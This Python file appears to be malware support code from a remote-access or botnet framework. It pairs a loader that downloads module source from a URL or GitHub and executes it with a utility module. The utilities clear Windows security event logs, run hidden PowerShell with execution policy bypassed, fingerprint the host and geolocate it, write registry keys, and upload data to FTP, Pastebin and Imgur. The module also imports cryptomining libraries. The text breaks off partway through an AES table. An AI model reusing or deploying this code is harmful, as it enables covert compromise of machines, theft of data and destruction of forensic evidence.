
# standard library
import imp
import sys
import logging
import contextlib
if sys.version_info[0] < 3:
    from urllib2 import urlopen
else:
    from urllib.request import urlopen


def log(info='', level='debug'):
    logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))


# main
class Loader(object):
    """
    The class that implements the remote import API.
    :param list modules: list of module/package names to make available for remote import
    :param str base_url: URL of directory/repository of modules being served through HTTPS

    """

    def __init__(self, modules, base_url):
        self.module_names = modules
        self.base_url = base_url + '/'
        self.non_source = False
        self.reload = False
        '''
        self.mod_msg = {}
        '''

    def find_module(self, fullname, path=None):
        log(level='debug', info= "FINDER=================")
        log(level='debug', info= "Searching: %s" % fullname)
        log(level='debug', info= "Path: %s" % path)
        log(level='info', info= "Checking if in declared remote module names...")
        if fullname.split('.')[0] not in self.module_names + list(set([_.split('.')[0] for _ in self.module_names])):
            log(level='info', info= "[-] Not found!")
            return None
        log(level='info', info= "Checking if built-in....")
        try:
            file, filename, description = imp.find_module(fullname.split('.')[-1], path)
            if filename:
                log(level='info', info= "[-] Found locally!")
                return None
        except ImportError:
            pass
        log(level='info', info= "Checking if it is name repetition... ")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            log(level='info', info= "[-] Found locally!")
            return None
        '''
        msg = self.__get_source(fullname,path)
        if msg==None:
            return None
        is_package,final_url,source_code=msg
        self.mod_msg.setdefault(fullname,MsgClass(is_package,final_url,source_code))
        '''
        log(level='info', info= "[+] Module/Package '%s' can be loaded!" % fullname)
        return self

    def load_module(self, name):
        '''
        mod_msg=self.mod_msg.get(fullname)
        '''
        imp.acquire_lock()
        log(level='debug', info= "LOADER=================")
        log(level='debug', info= "Loading %s..." % name)
        if name in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" loaded as a top level module!' % name)
            imp.release_lock()
            return sys.modules[name.split('.')[-1]]
        module_url = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url = None
        final_src = None
        try:
            log(level='debug', info= "Trying to import '%s' as package from: '%s'" % (name, package_url))
            package_src = None
            if self.non_source:
                package_src = self.__fetch_compiled(package_url)
            if package_src == None:
                package_src = urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            log(level='info', info= "[-] '%s' is not a package (%s)" % (name, str(e)))
        if final_src == None:
            try:
                log(level='debug', info= "[+] Trying to import '%s' as module from: '%s'" % (name, module_url))
                module_src = None
                if self.non_source:
                    module_src = self.__fetch_compiled(module_url)
                if module_src == None:
                    module_src = urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                log(level='info', info= "[-] '%s' is not a module (%s)" % (name, str(e)))
                imp.release_lock()
                return None
        log(level='debug', info= "[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name.rpartition('.')[0]
        else:
            mod.__package__ = name
            mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        log(level='debug', info= "[+] Ready to execute '%s' code" % name)
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        log(level='info', info= "[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod
    
    '''
    def __get_source(self,fullname,path):
        url=self.baseurl+"/".join(fullname.split("."))
        source=None
        is_package=None
        
        # Check if it's a package
        try:
            final_url=url+"/__init__.py"
            source = urlopen(final_url).read()
            is_package=True
        except Exception as e:
            log(level='debug', info= "[-] %s!" %e)
            
        # A normal module
        if is_package == None :  
            try:
                final_url=url+".py"
                source = urlopen(final_url).read()
                is_package=False
            except Exception as e:
                log(level='debug', info= "[-] %s!" %e)
                return None
                
        return is_package,final_url,source
    '''
    
    def __fetch_compiled(self, url):
        import marshal
        module_src = None
        try:
            module_compiled = urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError:
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])  # Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
                return module_src
            except ValueError:
                pass
        except IOError as e:
            log(level='debug', info= "[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src


def __create_github_url(username, repo, branch='master'):
    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
    return github_raw_url.format(user=username, repo=repo, branch=branch)


def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
    if username == None or repo == None:
        raise Exception("'username' and 'repo' parameters cannot be None")
    if commit and branch:
        raise Exception("'branch' and 'commit' parameters cannot be both set!")
    if commit:
        branch = commit
    if not branch:
        branch = 'master'
    if not module:
        module = repo
    if type(module) == str:
        module = [module]
    url = url_builder(username, repo, branch)
    return add_remote_repo(module, url)


def add_remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Function that creates and adds to the 'sys.meta_path' an Loader object.
    The parameters are the same as the Loader class contructor.
    """
    importer = Loader(modules, base_url)
    sys.meta_path.insert(0, importer)
    return importer


def remove_remote_repo(base_url):
    """
    Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
    """
    for importer in sys.meta_path:
        try:
            if importer.base_url.startswith(base_url):  # an extra '/' is always added
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e: pass
    return False


@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Context Manager that provides remote import functionality through a URL.
    The parameters are the same as the Loader class contructor.
    """
    importer = add_remote_repo(modules, base_url)
    yield
    remove_remote_repo(base_url)


@contextlib.contextmanager
def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
    """
    Context Manager that provides import functionality from Github repositories through HTTPS.
    The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
    """
    importer = _add_git_repo(__create_github_url,
        username, repo, module=module, branch=branch, commit=commit)
    yield
    remove_remote_repo(importer.base_url)

import copy
import signal
import struct
import errno
import multiprocessing
import requests
import hashlib
import threading
import time
import binascii
import numpy
import ftplib
import socket
import random
import subprocess
import functools
import uuid
import sys
import logging
import select
import os
import zipfile
import zlib
import json
import base64
import collections

try:
    import pycryptonight
    import pyrx
except ImportError: pass


def log(info, level='debug'):
    """
    Log output to the console (if verbose output is enabled)

    """
    import logging
    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))


def imports(source, target=None):
    """
    Attempt to import each package into the module specified

    `Required`
    :param list source: package/module to import

    `Optional`
    :param object target: target object/module to import into

    """
    if isinstance(source, str):
        source = source.split()
    if isinstance(target, dict):
        module = target
    elif hasattr(target, '__dict__'):
        module = target.__dict__
    else:
        module = globals()
    for src in source:
        try:
            exec("import {}".format(src), target)
        except ImportError:
            log("missing package '{}' is required".format(source))


def is_compatible(platforms=['win32','linux2','darwin'], module=None):
    """
    Verify that a module is compatible with the host platform

    `Optional`
    :param list platforms:   compatible platforms
    :param str module:       name of the module

    """
    import sys
    if sys.platform in platforms:
        return True
    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
    return False


def platform():
    """
    Return the system platform of host machine

    """
    import sys
    return sys.platform


def public_ip():
    """
    Return public IP address of host machine

    """
    import sys
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib import urlopen
    return urlopen('http://api.ipify.org').read().decode()


def local_ip():
    """
    Return local IP address of host machine

    """
    import socket
    return socket.gethostbyname(socket.gethostname())


def mac_address():
    """
    Return MAC address of host machine

    """
    import uuid
    return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()


def architecture():
    """
    Check if host machine has 32-bit or 64-bit processor architecture

    """
    import struct
    return int(struct.calcsize('P') * 8)


def device():
    """
    Return the name of the host machine

    """
    import socket
    return socket.getfqdn(socket.gethostname())


def username():
    """
    Return username of current logged in user

    """
    import os
    return os.getenv('USER', os.getenv('USERNAME', 'user'))


def administrator():
    """
    Return True if current user is administrator, otherwise False

    """
    import os
    import ctypes
    return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)


def geolocation():
    """
    Return latitute/longitude of host machine (tuple)
    """
    import sys
    import json
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib2 import urlopen
    response = urlopen('http://ipinfo.io').read()
    json_data = json.loads(response)
    latitude, longitude = json_data.get('loc').split(',')
    return (latitude, longitude)


def ipv4(address):
    """
    Check if valid IPv4 address

    `Required`
    :param str address:   string to check

    Returns True if input is valid IPv4 address, otherwise False

    """
    import socket
    try:
        if socket.inet_aton(str(address)):
            return True
    except:
        return False


def status(timestamp):
    """
    Check the status of a job/thread

    `Required`
    :param float timestamp:   Unix timestamp (seconds since the Epoch)

    """
    import time
    c = time.time() - float(timestamp)
    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
    return ', '.join([i for i in data if i])


def unzip(filename):
    """
    Extract all files from a ZIP archive

    `Required`
    :param str filename:     path to ZIP archive

    """
    import os
    import zipfile
    z = zipfile.ZipFile(filename)
    path = os.path.dirname(filename)
    z.extractall(path=path)


def post(url, headers={}, data={}, json={}, as_json=False):
    """
    Make a HTTP post request and return response

    `Required`
    :param str url:       URL of target web page

    `Optional`
    :param dict headers:  HTTP request headers
    :param dict data:     HTTP request POST data
    :param dict json:     POST data in JSON format
    :param bool as_json:  return JSON formatted output

    """
    try:
        import requests
        req = requests.post(url, headers=headers, data=data, json=json)
        output = req.content
        if as_json:
            try:
                output = req.json()
            except: pass
        return output
    except:
        import sys
        if sys.version_info[0] > 2:
            from urllib.request import urlopen,urlencode,Request
        else:
            from urllib import urlencode
            from urllib2 import urlopen,Request
        data = urlencode(data)
        req  = Request(str(url), data=data)
        for key, value in headers.items():
            req.headers[key] = value
        output = urlopen(req).read()
        if as_json:
            import json
            try:
                output = json.loads(output)
            except: pass
        return output


def normalize(source):
    """
    Normalize data/text/stream

    `Required`
    :param source:   string OR readable-file

    """
    import os
    if os.path.isfile(source):
        return open(source, 'rb').read()
    elif hasattr(source, 'getvalue'):
        return source.getvalue()
    elif hasattr(source, 'read'):
        if hasattr(source, 'seek'):
            source.seek(0)
        return source.read()
    else:
        return bytes(source)


def registry_key(key, subkey, value):
    """
    Create a new Windows Registry Key in HKEY_CURRENT_USER

    `Required`
    :param str key:         primary registry key name
    :param str subkey:      registry key sub-key name
    :param str value:       registry key sub-key value

    Returns True if successful, otherwise False

    """
    try:
        import _winreg
        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(reg_key)
        return True
    except Exception as e:
        log(e)
        return False


def png(image):
    """
    Transforms raw image data into a valid PNG data

    `Required`
    :param image:   `numpy.darray` object OR `PIL.Image` object

    Returns raw image data in PNG format

    """
    import sys
    import zlib
    import numpy
    import struct

    try:
        from StringIO import StringIO  # Python 2
    except ImportError:
        from io import StringIO        # Python 3

    if isinstance(image, numpy.ndarray):
        width, height = (image.shape[1], image.shape[0])
        data = image.tobytes()
    elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
        width, height = (image.width, image.height)
        data = image.rgb
    else:
        raise TypeError("invalid input type: {}".format(type(image)))

    line = width * 3
    png_filter = struct.pack('>B', 0)
    scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)

    ihdr = [b"", b'IHDR', b"", b""]
    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
    ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
    ihdr[0] = struct.pack('>I', len(ihdr[2]))

    idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
    idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
    idat[0] = struct.pack('>I', len(idat[2]))

    iend = [b"", b'IEND', b"", b""]
    iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
    iend[0] = struct.pack('>I', len(iend[2]))

    fileh = StringIO()
    fileh.write(str(magic))
    fileh.write(str(b"".join(ihdr)))
    fileh.write(str(b"".join(idat)))
    fileh.write(str(b"".join(iend)))
    fileh.seek(0)
    output = fileh.getvalue()
    if sys.version_info[0] > 2:
        output = output.encode('utf-8') # python3 compatibility
    return output


def delete(target):
    """
    Tries to delete file via multiple methods, if necessary

    `Required`
    :param str target:     target filename to delete

    """
    import os
    import shutil
    try:
        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
    except OSError: pass
    try:
        if os.path.isfile(target):
            os.remove(target)
        elif os.path.isdir(target):
            import shutil
            shutil.rmtree(target, ignore_errors=True)
    except OSError: pass


def clear_system_logs():
    """
    Clear Windows system logs (Application, security, Setup, System)

    """
    try:
        for log in ["application","security","setup","system"]:
            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
            if output:
                log(output)
    except Exception as e:
        log(e)


def kwargs(data):
    """
    Takes a string as input and returns a dictionary of keyword arguments

    `Required`
    :param str data:    string to parse for keyword arguments

    Returns dictionary of keyword arguments as key-value pairs

    """
    try:
        return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
    except Exception as e:
        log(e)


def powershell(code):
    """
    Execute code in Powershell.exe and return any results

    `Required`
    :param str code:      script block of Powershell code

    Returns any output from Powershell executing the code

    """
    import os
    import base64
    try:
        powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
    except Exception as e:
        log("{} error: {}".format(powershell.__name__, str(e)))


def display(output, color=None, style=None, end='\n', event=None, lock=None):
    """
    Display output in the console

    `Required`
    :param str output:    text to display

    `Optional`
    :param str color:     red, green, cyan, magenta, blue, white
    :param str style:     normal, bright, dim
    :param str end:       __future__.print_function keyword arg
    :param lock:          threading.Lock object
    :param event:         threading.Event object

    """
    # if isinstance(output, bytes):
    #     output = output.decode('utf-8')
    # else:
    #     output = str(output)
    # _color = ''
    # if color:
    #     _color = getattr(colorama.Fore, color.upper())
    # _style = ''
    # if style:
    #     _style = getattr(colorama.Style, style.upper())
    # exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
    print(output)


def color():
    """
    Returns a random color for use in console display

    """
    try:
        import random
        return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
    except Exception as e:
        log("{} error: {}".format(color.__name__, str(e)))


def imgur(source, api_key=None):
    """
    Upload image file/data to Imgur

    """
    import base64
    if api_key:
        response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
        return response['data']['link'].encode()
    else:
        log("No Imgur API key found")


def pastebin(source, api_key):
    """
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key

    """
    import sys
    if sys.version_info[0] > 2:
        from urllib.parse import urlsplit,urlunsplit
    else:
        from urllib2 import urlparse
        urlsplit = urlparse.urlsplit
        urlunsplit = urlparse.urlunsplit
    if isinstance(api_key, str):
        try:
            info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
            paste = post('https://pastebin.com/api/api_post.php', data=info)
            parts = urlsplit(paste)
            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
            if not result.endswith('/'):
                result += '/'
            return result
        except Exception as e:
            log("Upload to Pastebin failed with error: {}".format(e))
    else:
        log("No Pastebin API key found")


def ftp(source, host=None, user=None, password=None, filetype=None):
    """
    Upload file/data to FTP server

    `Required`
    :param str source:    data or readable file-like object
    :param str host:      FTP server hostname
    :param str user:      FTP account username
    :param str password:  FTP account password

    `Optional`
    :param str filetype:  target file type (default: .txt)

    """
    import os
    import time
    import ftplib

    try:
        from StringIO import StringIO  # Python 2
    except ImportError:
        from io import StringIO        # Python 3

    if host and user and password:
        path  = ''
        local = time.ctime().split()
        if os.path.isfile(str(source)):
            path   = source
            source = open(path, 'rb')
        elif hasattr(source, 'seek'):
            source.seek(0)
        else:
            source = StringIO(source)
        try:
            ftp = ftplib.FTP(host=host, user=user, password=password)
        except:
            return "Upload failed - remote FTP server authorization error"
        addr = public_ip()
        if 'tmp' not in ftp.nlst():
            ftp.mkd('/tmp')
        if addr not in ftp.nlst('/tmp'):
            ftp.mkd('/tmp/{}'.format(addr))
        if path:
            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
        else:
            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
        stor = ftp.storbinary('STOR ' + path, source)
        return path
    else:
        log('missing one or more required arguments: host, user, password')


def config(*arg, **options):
    """
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)

    """
    import functools
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        return wrapper
    return _config


def threaded(function):
    """
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to run in a thread

    """
    import time
    import threading
    import functools
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded


def _compact_word(word):
    return (word[0] << 24) | (word[1] << 16) | (word[2] << 8) | word[3]

def _string_to_bytes(text):
    return list(ord(c) for c in text)

def _bytes_to_string(binary):
    return "".join(chr(b) for b in binary)

def _concat_list(a, b):
    return a + b


# Python 3 compatibility
try:
    xrange
except NameError:
    xrange = range

    # Python 3 supports bytes, which is already an array of integers
    def _string_to_bytes(text):
        if isinstance(text, bytes):
            return text
        return [ord(c) for c in text]

    # In Python 3, we return bytes
    def _bytes_to_string(binary):
        return bytes(binary)

    # Python 3 cannot concatenate a list onto a bytes, so we bytes-ify it first
    def _concat_list(a, b):
        return a + bytes(b)


class AES(object):
    """
    Encapsulates the AES block cipher

    """

    # Number of rounds by keysize
    number_of_rounds = {16: 10, 24: 12, 32: 14}

    # Round constant words
    rcon = [ 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91 ]

    # S-box and Inverse S-box (S is for Substitution)
    S = [ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ]
    Si =[ 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d ]

    # Transformations for encryption
    T1 = [ 0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554, 0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a, 0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b, 0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b, 0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f, 0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f, 0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9ab5, 0x0e070709, 0x24121236, 0x1b80809b, 0xdfe2e23d, 0xcdebeb26, 0x4e272769, 0x7fb2b2cd, 0xea75759f, 0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, 0xdc6e6eb2, 0xb45a5aee, 0x5ba0a0fb, 0xa45252f6, 0x763b3b4d, 0xb7d6d661, 0x7db3b3ce, 0x5229297b, 0xdde3e33e, 0x5e2f2f71, 0x13848497, 0xa65353f5, 0xb9d1d168, 0x00000000, 0xc1eded2c, 0x40202060, 0xe3fcfc1f, 0x79b1b1c8, 0xb65b5bed, 0xd46a6abe, 0x8dcbcb46, 0x67bebed9, 0x7239394b, 0x944a4ade, 0x984c4cd4, 0xb05858e8, 0x85cfcf4a, 0xbbd0d06b, 0xc5efef2a, 0x4faaaae5, 0xedfbfb16, 0x864343c5, 0x9a4d4dd7, 0x66333355, 0x11858594, 0x8a4545cf, 0xe9f9f910, 0x04020206, 0xfe7f7f81, 0xa05050f0, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3, 0xa25151f3, 0x5da3a3fe, 0x804040c0, 0x058f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, 0xf1f5f504, 0x63bcbcdf, 0x77b6b6c1, 0xafdada75, 0x42212163, 0x20101030, 0xe5ffff1a, 0xfdf3f30e, 0xbfd2d26d, 0x81cdcd4c, 0x180c0c14, 0x26131335, 0xc3ecec2f, 0xbe5f5fe1, 0x359797a2, 0x884444cc, 0x2e171739, 0x93c4c457, 0x55a7a7f2, 0xfc7e7e82, 0x7a3d3d47, 0xc86464ac, 0xba5d5de7, 0x3219192b, 0xe6737395, 0xc06060a0, 0x19818198, 0x9e4f4fd1, 0xa3dcdc7f, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0x0b888883, 0x8c4646ca, 0xc7eeee29, 0x6bb8b8d3, 0x2814143c, 0xa7dede79, 0xbc5e5ee2, 0x160b0b1d, 0xaddbdb76, 0xdbe0e03b, 0x64323256, 0x743a3a4e, 0x140a0a1e, 0x924949db, 0x0c06060a, 0x4824246c, 0xb85c5ce4, 0x9fc2c25d, 0xbdd3d36e, 0x43acacef, 0xc46262a6, 0x399191a8, 0x319595a4, 0xd3e4e437, 0xf279798b, 0xd5e7e732, 0x8bc8c843, 0x6e373759, 0xda6d6db7, 0x018d8d8c, 0xb1d5d564, 0x9c4e4ed2, 0x49a9a9e0, 0xd86c6cb4, 0xac5656fa, 0xf3f4f407, 0xcfeaea25, 0xca6565af, 0xf47a7a8e, 0x47aeaee9, 0x10080818, 0x6fbabad5, 0xf0787888, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, 0x97c6c651, 0xcbe8e823, 0xa1dddd7c, 0xe874749c, 0x3e1f1f21, 0x964b4bdd, 0x61bdbddc, 0x0d8b8b86, 0x0f8a8a85, 0xe0707090, 